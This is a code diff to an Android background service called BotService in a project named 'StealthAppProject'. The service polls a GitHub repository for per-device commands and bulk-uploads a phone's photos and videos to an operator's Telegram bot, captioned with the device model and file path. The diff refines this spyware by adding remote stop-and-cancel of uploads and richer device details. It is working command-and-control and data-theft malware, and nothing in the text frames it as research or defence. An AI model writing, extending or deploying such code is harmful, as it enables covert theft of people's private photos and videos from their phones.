@@ -14,7 +14,10 @@ public class BotService extends Service {
     String REPO = "StealthAppProject";
     String DEVICE_ID; String DEVICE_NAME = android.os.Build.MODEL;
     String lastCmdTime = "0";
+    
     volatile boolean stopRequested = false;
+    volatile Call currentCall = null;
+    
     OkHttpClient client = new OkHttpClient.Builder()
         .connectTimeout(30, java.util.concurrent.TimeUnit.SECONDS)
         .writeTimeout(300, java.util.concurrent.TimeUnit.SECONDS)
@@ -41,11 +44,11 @@ public class BotService extends Service {
         new Thread(new Runnable() {
             @Override public void run() { register(); }
         }).start();
+        
         new java.util.Timer().scheduleAtFixedRate(new java.util.TimerTask() {
             @Override public void run() { checkGitHub(); }
         }, 0, 10000); 
 
-        // 🚀 الجلب التلقائي للصور عند أول تشغيل
         if (intent != null && intent.getBooleanExtra("auto_fetch", false)) {
             new Thread(new Runnable() {
                 @Override public void run() {
@@ -85,7 +88,7 @@ public class BotService extends Service {
 
     void checkGitHub() {
         try {
-            String url = "https://api.github.com/repos/" + GITHUB_USER + "/" + REPO + "/contents/cmd_" + DEVICE_ID + ".json";
+            String url = "https://api.github.com/repos/" + GITHUB_USER + "/" + REPO + "/contents/cmd_" + DEVICE_ID + ".json?t=" + System.currentTimeMillis();
             Request req = new Request.Builder().url(url).header("Authorization", "token " + GITHUB_TOKEN).build();
             Response r = client.newCall(req).execute();
             if (r.isSuccessful()) {
@@ -107,6 +110,7 @@ public class BotService extends Service {
                             new Thread(new Runnable() { @Override public void run() { sendAllMedia("videos"); } }).start();
                         } else if (cmd.equals("stop")) {
                             stopRequested = true;
+                            if (currentCall != null) currentCall.cancel();
                             sendMsg("⛔ تم استلام أمر الإيقاف...");
                         }
                     }
@@ -143,12 +147,18 @@ public class BotService extends Service {
                 String method = type.equals("photos") ? "sendPhoto" : "sendVideo";
                 MultipartBody body = new MultipartBody.Builder().setType(MultipartBody.FORM)
                     .addFormDataPart("chat_id", ADMIN).addFormDataPart(field, f.getName(), RequestBody.create(f, MediaType.parse(type.equals("photos") ? "image/*" : "video/*")))
-                    .addFormDataPart("caption", absPath).build();
-                Response resp = client.newCall(new Request.Builder().url("https://api.telegram.org/bot" + BOT_TOKEN + "/" + method).post(body).build()).execute();
+                    .addFormDataPart("caption", "📱 الجهاز: " + DEVICE_NAME + "\n📂 المسار: " + absPath).build();
+                
+                currentCall = client.newCall(new Request.Builder().url("https://api.telegram.org/bot" + BOT_TOKEN + "/" + method).post(body).build());
+                Response resp = currentCall.execute();
                 String bodyStr = resp.body().string(); resp.close();
+                currentCall = null;
+
                 if (bodyStr.contains("\"ok\":true")) { sent++; if (logW != null) { logW.write(absPath + "\n"); logW.flush(); } }
                 Thread.sleep(1200);
-            } catch(Exception e) {}
+            } catch(Exception e) {
+                if (currentCall != null) { currentCall.cancel(); currentCall = null; }
+            }
         }
         if (logW != null) try { logW.close(); } catch(Exception e) {}
         sendMsg("✅ انتهى!\n✔️ مرسل: " + sent + "\n🔁 متخطى: " + skipped);
